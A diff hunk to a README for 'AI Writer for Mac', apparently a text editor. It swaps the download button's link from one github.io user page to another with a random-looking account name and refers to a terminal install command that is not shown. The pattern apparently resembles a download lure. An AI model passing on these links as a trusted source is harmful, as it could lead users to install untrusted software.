@@ -3,7 +3,7 @@
 
 AI Writer for Mac is a minimal, distraction-free text editor designed to help you focus on writing. 📝 With a clean interface, powerful tools, and Markdown support, it is perfect for bloggers, students, and professionals who need a reliable environment for content creation.  
 
-[![Download for Mac](https://img.shields.io/badge/Download-for%20Mac-black?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/aiwriter)  
+[![Download for Mac](https://img.shields.io/badge/Download-for%20Mac-black?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/aiwriter)  
 
 If the download button does not work, follow the installation instructions below using the terminal command.  
 
